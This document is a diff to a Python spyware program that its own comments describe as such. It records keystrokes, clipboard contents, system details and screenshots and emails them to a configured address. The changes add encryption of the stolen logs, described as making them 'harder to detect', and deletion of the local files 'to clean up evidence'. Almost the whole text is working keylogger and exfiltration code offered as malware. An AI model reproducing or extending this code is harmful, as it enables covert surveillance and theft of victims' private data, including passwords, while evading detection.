@@ -1,5 +1,4 @@
-# Still working on adding encryption, getpass, and a way to iterate screenshots
-# All unused modules are for that
+# I still need to put in a way to add iterations to parts of the spyware so it repeats certain steps
 
 from email import encoders
 from email.mime.multipart import MIMEMultipart
@@ -25,27 +24,37 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
+
+
 # Declaring important variables for data storage
 keys_info = "keysInfo.txt"
 system_info = "system_info.txt"
 clipboard_info = "clipboard.txt"
 screenshot_info = "screenshot.png"
 
-# time_iteration = 15
-# num_iterations_end = 3
+keys_info_e = "e_key_log.txt"
+system_info_e = "e_system_info.txt"
+clipboard_info_e = "e_clipboard.txt"
 
 # Email account the information will be sent to
-emailAddress = ""
-password = ""
-toAddress = ""
+emailAddress = " "
+password = " "
+toAddress = " "
+
+username = getpass.getuser()
+
+crypt_key = str(" ")  # the encryption key
 
 # File path the data variables will be stored into
-file_path = ""
+file_path = " "
 extend = "\\"
+file_merge = file_path + extend
 
 # Creating an array to hold keys, and starting a counter to reset key presses.
-count = 0
 keys = []
+count = 0
+
+
 
 
 # Main Keylogging Module
@@ -92,8 +101,8 @@ def send_email(filename, attachment, toAddress):
     msg = MIMEMultipart()
     msg['From'] = fromAddress
     msg['To'] = toAddress
-    msg['Subject'] = "Keylog File"
-    body = "New log files"
+    msg['Subject'] = "Key log files"
+    body = "New log file"
     msg.attach(MIMEText(body, 'plain'))
     filename = filename
     attachment = open(attachment, 'rb')
@@ -108,9 +117,6 @@ def send_email(filename, attachment, toAddress):
     text = msg.as_string()
     s.sendmail(fromAddress, toAddress, text)
     s.quit()
-
-
-send_email(keys_info, file_path + extend + keys_info, toAddress)
 
 
 # Extracts a lot of information about the computer and saves it to the file path
@@ -153,13 +159,37 @@ def screenshot():
     im.save(file_path + extend + screenshot_info)
 
 
-# Calling all of the spyware modules and emailing the results.
-
+# Calling all of the spyware modules and emailing the screenshot
 copy_clipboard()
-send_email(clipboard_info, file_path + extend + clipboard_info, toAddress)
 
 computer_info()
-send_email(system_info, file_path + extend + system_info, toAddress)
 
 screenshot()
 send_email(screenshot_info, file_path + extend + screenshot_info, toAddress)
+
+
+# Encrypts the text files the keylogger saves from the given key, making it harder to detect
+files_encrypt = [file_merge + system_info, file_merge + clipboard_info, file_merge + keys_info]
+encrypted_names = [file_merge + system_info_e, file_merge + clipboard_info_e, file_merge + keys_info_e]
+
+count = 0
+
+for encrypting_file in files_encrypt:
+    with open(files_encrypt[count], 'rb') as f:
+        data = f.read()
+
+    fernet = Fernet(crypt_key)
+    encrypted = fernet.encrypt(data)
+
+    with open(encrypted_names[count], 'wb') as f:
+        f.write(encrypted)
+
+    send_email(encrypted_names[count], encrypted_names[count], toAddress)
+    count += 1
+
+time.sleep(120)
+
+# Deleting files in order to clean up evidence of something going on
+delete_files = [system_info, clipboard_info, keys_info, screenshot_info]
+for file in delete_files:
+    os.remove(file_merge + file)
